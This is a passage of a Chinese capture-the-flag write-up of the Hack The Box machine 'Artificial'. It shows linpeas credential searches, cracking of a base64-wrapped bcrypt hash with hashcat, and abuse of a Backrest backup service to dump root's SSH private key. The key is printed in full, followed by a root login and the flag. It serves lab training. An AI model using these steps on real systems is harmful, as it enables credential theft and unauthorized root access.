-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 /var/backups/backrest_backup.tar.gz
-rw-r--r-- 1 root root 2743 Mar 14  2023 /etc/apt/sources.list.curtin.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)                   
Found /opt/backrest/oplog.sqlite: SQLite 3.x database, user version 4, last written using SQLite version 3031001
Found /opt/backrest/tasklogs/logs.sqlite: SQLite 3.x database, last written using SQLite version 3046000
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3031001
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3031001

 -> Extracting tables from /opt/backrest/oplog.sqlite (limit 20)
 -> Extracting tables from /opt/backrest/tasklogs/logs.sqlite (limit 20)                           
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)                       
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)                          

╔══════════╣ Web files?(output limit)                             
/var/www/:                       
total 12K
drwxr-xr-x  3 root root 4.0K Jun  2 07:38 .
drwxr-xr-x 13 root root 4.0K Jun  2 07:38 ..
drwxr-xr-x  2 root root 4.0K Jun  2 07:38 html

/var/www/html:
total 12K
drwxr-xr-x 2 root root 4.0K Jun  2 07:38 .
drwxr-xr-x 3 root root 4.0K Jun  2 07:38 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)                           
-rw-r--r-- 1 gael gael 220 Feb 25  2020 /home/gael/.bash_logout
-rw-r--r-- 1 root staff 58 Oct 13  2024 /usr/local/lib/python3.8/dist-packages/numpy/core/include/numpy/.doxyfile
-rw-r--r-- 1 root staff 82 Oct 13  2024 /usr/local/lib/python3.8/dist-packages/numpy/f2py/tests/src/f2cmap/.f2py_f2cmap
-rw-r--r-- 1 root staff 29 Oct 13  2024 /usr/local/lib/python3.8/dist-packages/numpy/f2py/tests/src/assumed_shape/.f2py_f2cmap
-rw-r--r-- 1 landscape landscape 0 Mar 14  2023 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
-rw------- 1 root root 0 Mar 14  2023 /etc/.pwd.lock
-rw-r--r-- 1 root root 0 Jul  9 07:56 /run/network/.ifstate.lock

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                
-rwxrwxrwx 1 gael gael 956174 Jul  9 08:50 /tmp/linpeas.sh
-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 /var/backups/backrest_backup.tar.gz

╔══════════╣ Searching passwords in history files                 

╔══════════╣ Searching *password* or *credential* files in home (limit 70)                         
/etc/pam.d/common-password       
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-38.pyc   
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-38.pyc
/usr/lib/systemd/systemd-reply-password                           
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path                     
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path
/usr/lib/systemd/system/systemd-ask-password-plymouth.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc  
/usr/share/doc/git/contrib/credential/netrc/t-git-credential-netrc.sh
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential.1.gz                           
/usr/share/man/man1/git-credential-cache.1.gz                     
/usr/share/man/man1/git-credential-cache--daemon.1.gz             
/usr/share/man/man1/git-credential-store.1.gz                     
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz        
/usr/share/man/man8/systemd-ask-password-console.service.8.gz     
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz           
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz        
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords                              
/var/lib/fwupd/pki/secret.key
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs   

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs   

╔══════════╣ Searching passwords inside logs (limit 70)           
Binary file /var/log/apt/eipp.log.xz matches
/var/log/dmesg.0:[    4.529076] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/dmesg:[    3.592934] systemd[1]: Started Forward Password Requests to Wall Directory Watch.

╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars                   
HOME=/home/gael                  
LANG=en_US.UTF-8
LESSCLOSE=/usr/bin/lesspipe %s %s
LESSOPEN=| /usr/bin/lesspipe %s
_=./linpeas.sh
LISTEN_FDNAMES=dbus.socket
LISTEN_FDS=1
LOGNAME=gael
MANAGERPID=1089
MOTD_SHOWN=pam
NOTIFY_SOCKET=/run/systemd/notify
OLDPWD=/
PWD=/tmp
SHELL=/bin/bash
SHLVL=1
SSH_CLIENT=10.10.16.47 34790 22
SSH_CONNECTION=10.10.16.47 34790 10.10.11.74 22
SSH_TTY=/dev/pts/0
TERM=xterm-256color
USER=gael
_=/usr/bin/dd
_=/usr/bin/grep
_=/usr/bin/xxd
XDG_RUNTIME_DIR=/run/user/1000


                                ╔════════════════╗                
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                 
                                ╚════════════════╝                
Regexes to search for API keys aren't activated, use param '-r' 
```

### backrest_backup.tar.gz

这里有一个备份文件：


![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/b37573dd6e994fb8b5175337f84d5065.png)


文件传到本地以后进行解压：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# tar xvf backrest_backup.tar.gz
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh
```

config.json里面发现一个账号密码:

```bash
┌──(root㉿kali)-[/home/kali/Desktop/backrest]
└─# cat .config/backrest/config.json 
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

Bcrypt加密密码，但疑似被先base64了，先base64解码再backrest：

```bash
┌──(root㉿kali)-[/home/kali/Desktop/backrest]
└─# echo "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP" | base64 -d
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO

┌──(root㉿kali)-[/home/kali/Desktop/backrest]
└─# hashcat -m 3200 '$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO' /usr/share/wordlists/rockyou.txt
```

获得密码：
**!@#$%^**

这个备份root账户不是系统账户，应该是什么服务的账户密码，看看网络连接：

```bash
gael@artificial:/tmp$ netstat -tunlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -          
```

有个5000和9898端口只能geal访问
ssl隧道，5000需要私钥失败，9898有密码可以，是个备份网站，然后输入前面获得的备份用户和密码：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/bcd457555ef34cb783f83c287dbede67.png)

### Backrest

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a166c88fab304132ae325c14af687ea5.png)

```
    第一步：backup /root/.ssh/
    第二步：snapshots
    第三步：ls 快照ID
    第四步：dump 快照ID /root/.ssh/id_rsa
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/c163cf826071438db36697a83f47c8ae.png)


得私钥后，把私钥粘贴到本地：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# cat id_rsa                 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

┌──(root㉿kali)-[/home/kali/Desktop]
└─# ssh root@10.10.11.74 -i id_rsa

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 09 Jul 2025 10:32:48 AM UTC

  System load:           0.0
  Usage of /:            60.2% of 7.53GB
  Memory usage:          37%
  Swap usage:            0%
  Processes:             263
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.74
  IPv6 address for eth0: dead:beef::250:56ff:feb9:18e6


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jul 9 10:32:49 2025 from 10.10.16.47
root@artificial:~# 
root@artificial:~# id
uid=0(root) gid=0(root) groups=0(root)
root@artificial:~# ls -l /root
total 8
-rw-r----- 1 root root   33 Jul  9 07:57 root.txt
drwxr-xr-x 2 root root 4096 Jun  9 13:57 scripts
root@artificial:~# cat root.txt
ed14ddf107ef4bccc5644e9ad1c70f59
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/ce1cf6ba7f9c4c1a990cda444a06df6d.png)

## WP

[HTB Artificial 靶场：从AI模型的RCE到NAS备份系统提权](https://blog.csdn.net/PEIWIN/article/details/148848465)
[Hack The Box：Artificial](https://mp.weixin.qq.com/s/Pa8OcYNZBscZpBPQ6Wg9QA)
